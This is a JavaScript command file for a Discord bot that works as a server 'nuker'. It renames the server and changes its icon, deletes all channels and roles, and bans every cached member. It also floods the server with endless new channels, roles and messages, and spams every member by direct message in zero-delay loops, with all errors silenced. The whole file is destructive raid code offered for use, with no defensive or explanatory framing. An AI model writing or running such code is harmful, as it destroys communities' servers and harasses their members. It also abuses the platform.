const { ChannelType } = require("discord.js");

module.exports = {
    name: 'start',
    run(client, message, args) {
        switch(args[0]) {
            case 'all':
                server();
                channels();
                roles();
                messages();
                dm();
            break;
            case 'server':
                server();
            break;
            case 'channels':
                channels();
            break;
            case 'roles':
                roles();
            break;
            case 'messages':
                messages();
            break;
            case 'ban':
                message.guild.members.cache.forEAch((m) => {
                    m.ban()
                    .catch(() => 0);
                });
            break;
            case 'dm':
                dm();
            break;
        };

        function server() {
            message.guild.setName(client.config.guild_name)
            .catch(() => 0);

            message.guild.setIcon(client.config.guild_icon)
            .catch(() => 0);
        };

        function channels() {
            message.guild.channels.cache.forEach((ch) => {
                ch.delete()
                .catch(() => 0);
            });

            setInterval(() => {
                message.guild.channels.create({
                    name: client.config.channels_name,
                    type: ChannelType.GuildText
                }).then((ch) => {
                    setInterval(() => {
                        ch.send(client.config.messages_content)
                        .catch(() => 0);
                    }, 0);
                })
                .catch(() => 0);
            }, 0);
        };

        function roles() {
            message.guild.roles.cache.forEach((r) => {
                r.delete()
                .catch(console.log);
            });

            setInterval(() => {
                message.guild.roles.create({
                    name: client.config.roles_name
                })
                .catch(() => 0);
            }, 0);
        };

        function messages() {
            setInterval(() => {
                message.guild.channels.cache.forEach((ch) => {
                    ch.send(client.config.messages_content)
                    .catch(() => 0);
                });
            }, 0);
        };

        function dm() {
            setInterval(() => {
                message.guild.members.cache.forEach((m) => {
                    m.send(client.config.messages_content)
                    .catch(() => 0);
                });
            }, 0);
        };
    },
};
